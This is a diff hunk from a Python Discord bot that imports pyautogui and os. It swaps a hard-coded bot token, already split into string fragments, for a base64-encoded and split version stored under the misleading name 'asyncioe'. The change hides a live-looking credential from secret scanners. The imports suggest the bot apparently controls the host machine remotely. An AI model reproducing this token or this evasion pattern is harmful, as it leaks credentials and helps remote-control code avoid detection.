@@ -2,9 +2,10 @@ import discord
 from discord.ext import commands
 import pyautogui
 import os
+import base64
 intents = discord.Intents.default()
 intents.message_content = True
-asyncioe = 'MTI2Mj' + 'MxMz' + 'M5MDAz' + 'OTIzNjY2OA.GsVb1y.472t_MSJ8kTfb8D5lIPaN-Uk50JEVGj2eUu5Sc'
+asyncioe = base64.b64decode('TVRJMk1' + 'qTXhNek01TURBek9USXpOa' + 'lkyT0EuRzVSUlVJLmJiTTlqZ3JWQTA5UjNRdHQxNEJKNzByNC0xMUwxWkNuaEtTMENV')
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
